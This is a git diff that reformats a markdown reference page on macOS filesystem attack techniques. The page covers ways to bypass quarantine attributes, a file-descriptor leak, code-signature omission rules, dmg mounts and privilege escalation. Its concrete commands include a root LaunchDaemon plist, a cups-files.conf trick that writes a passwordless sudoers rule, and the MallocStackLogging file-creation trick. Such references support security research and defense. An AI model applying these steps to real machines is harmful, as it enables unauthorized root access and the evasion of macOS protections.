@@ -1,6 +1,5 @@
 # macOS FS Tricks
 
-
 ## POSIX permissions combinations
 
 Permissions in a **directory**:
@@ -25,7 +24,7 @@ With any of the previous combinations, an attacker could **inject** a **sym/hard
 
 If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.
 
-Example in: [[https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions|https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions]]
+Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
 ## Symbolic Link / Hard Link
 
@@ -49,14 +48,14 @@ Example:
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    URL
-    file:///System/Applications/Calculator.app
-    URLPrefix
-    0
+    <key>URL</key>
+    <string>file:///System/Applications/Calculator.app</string>
+    <key>URLPrefix</key>
+    <integer>0</integer>
 </dict>
 </plist>
 ```
-```
+
 ## File Descriptors
 
 ### Leak FD (no `O_CLOEXEC`)
@@ -65,7 +64,7 @@ If a call to `open` doesn't have the flag `O_CLOEXEC` the file descriptor will b
 
 If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
 
-For example: [[https://youtu.be/f1HA5QhLQ7Y?t=21098|https://youtu.be/f1HA5QhLQ7Y?t=21098]], code: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging
+For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), code: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging
 
 ## Avoid quarantine xattrs tricks
 
@@ -74,7 +73,7 @@ For example: [[https://youtu.be/f1HA5QhLQ7Y?t=21098|https://youtu.be/f1HA5QhLQ7Y
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-```
+
 ### uchg / uchange / uimmutable flag
 
 If a file/folder has this immutable attribute it won't be possible to put an xattr on it
@@ -88,10 +87,10 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-```
+
 ### defvfs mount
 
-A **devfs** mount **doesn't support xattr**, more info in [[https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html|**CVE-2023-32364**]]
+A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 
 ```bash
 mkdir /tmp/mnt
@@ -101,7 +100,7 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-```
+
 ### writeextattr ACL
 
 This ACL prevents from adding `xattrs` to the file
@@ -126,14 +125,14 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-```
+
 ### **com.apple.acl.text xattr + AppleDouble**
 
 **AppleDouble** file format copies a file including its ACEs.
 
-In the [[https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html|**source code**]] it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
 
-Check the [[https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/|**original report**]] for more information.
+Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
 
 To replicate this we first need to get the correct acl string:
 
@@ -154,7 +153,7 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-```
+
 (Note that even if this works the sandbox write the quarantine xattr before)
 
 Not really needed but I leave it there just in case:
@@ -183,7 +182,6 @@ csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS
 status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
 NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
 ```
-```
 
 ## Bypass Code Signatures
 
@@ -194,53 +192,53 @@ However, there are some files whose signature won't be checked, these have the k
 ```xml
 <dict>
 ...
-	rules
+	<key>rules</key>
 	<dict>
 ...
-		^Resources/.\*\\.lproj/locversion.plist$
+		<key>^Resources/.*\.lproj/locversion.plist$</key>
 		<dict>
-			omit
-			
-			weight
-			1100
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>1100</real>
 		</dict>
 ...
 	</dict>
-	rules2
+	<key>rules2</key>
 ...
-		^(.\*/index.html)?\\.DS\_Store$
+		<key>^(.*/index.html)?\.DS_Store$</key>
 		<dict>
-			omit
-			
-			weight
-			2000
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>2000</real>
 		</dict>
 ...
-		^PkgInfo$
+		<key>^PkgInfo$</key>
 		<dict>
-			omit
-			
-			weight
-			20
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>20</real>
 		</dict>
 ...
-		^Resources/.\*\\.lproj/locversion.plist$
+		<key>^Resources/.*\.lproj/locversion.plist$</key>
 		<dict>
-			omit
-			
-			weight
-			1100
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>1100</real>
 		</dict>
 ...
 </dict>
 ```
-```
+
 It's possible to calculate the signature of a resource from the cli with:
 
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-```
+
 ## Mount dmgs
 
 A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
@@ -265,7 +263,7 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
-```
+
 Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
 However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
 
@@ -286,18 +284,18 @@ Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktrick
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
     <dict>
-        Label
-        com.sample.Load
-        ProgramArguments
+        <key>Label</key>
+        <string>com.sample.Load</string>
+        <key>ProgramArguments</key>
         <array>
-            /Applications/Scripts/privesc.sh
+            <string>/Applications/Scripts/privesc.sh</string>
         </array>
-        RunAtLoad
-        
+        <key>RunAtLoad</key>
+        <true/>
     </dict>
 </plist>
 ```
-```
+
 Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
 
 ### Sudoers File
@@ -312,7 +310,7 @@ You can also write files in **`/etc/paths.d`** to load new folders into the `PAT
 
 ### cups-files.conf
 
-This technique was used in [[https://www.kandji.io/blog/macos-audit-story-part1|this writeup]].
+This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).
 
 Create the file `/etc/cups/cups-files.conf` with the following content:
 
@@ -321,7 +319,7 @@ ErrorLog /etc/sudoers.d/lpe
 LogFilePerm 777
 <some junk>
 ```
-```
+
 This will create the file `/etc/sudoers.d/lpe` with permissions 777. The extra junk at the end is to trigger the error log creation.
 
 Then, write in `/etc/sudoers.d/lpe` the needed config to escalate privileges like `%staff ALL=(ALL) NOPASSWD:ALL`.
@@ -330,11 +328,11 @@ Then, modify the file `/etc/cups/cups-files.conf` again indicating `LogFilePerm 
 
 ### Sandbox Escape
 
-It's posisble to escape the macOS sandbox with a FS arbitrary write. For some examples check the page [[../../../../macos-auto-start-locations.md|macOS Auto Start]] but a common one is to write a Terminal preferences file in `~/Library/Preferences/com.apple.Terminal.plist` that executes a command at startup and call it using `open`.
+It's posisble to escape the macOS sandbox with a FS arbitrary write. For some examples check the page [macOS Auto Start](../../../../macos-auto-start-locations.md) but a common one is to write a Terminal preferences file in `~/Library/Preferences/com.apple.Terminal.plist` that executes a command at startup and call it using `open`.
 
 ## Generate writable files as other users
 
-This will generate a file that belongs to root that is writable by me ([[https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)|**code from here**]]. This might also work as privesc:
+This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). This might also work as privesc:
 
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
@@ -347,14 +345,14 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-```
+
 ## POSIX Shared Memory
 
 **POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.
 
+<details>
 
 **Producer Code Example**
-
 
 ```c
 // gcc producer.c -o producer -lrt
@@ -399,12 +397,12 @@ int main() {
     return 0;
 }
 ```
-```
 
+</details>
 
+<details>
 
 **Consumer Code Example**
-
 
 ```c
 // gcc consumer.c -o consumer -lrt
@@ -445,7 +443,8 @@ int main() {
 }
 
 ```
-```
+
+</details>
 
 ## macOS Guarded Descriptors
 
@@ -459,7 +458,5 @@ This feature is particularly useful for preventing certain classes of security v
 
 ## References
 
-- [[https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/|https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/]]
-
-
+- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
 
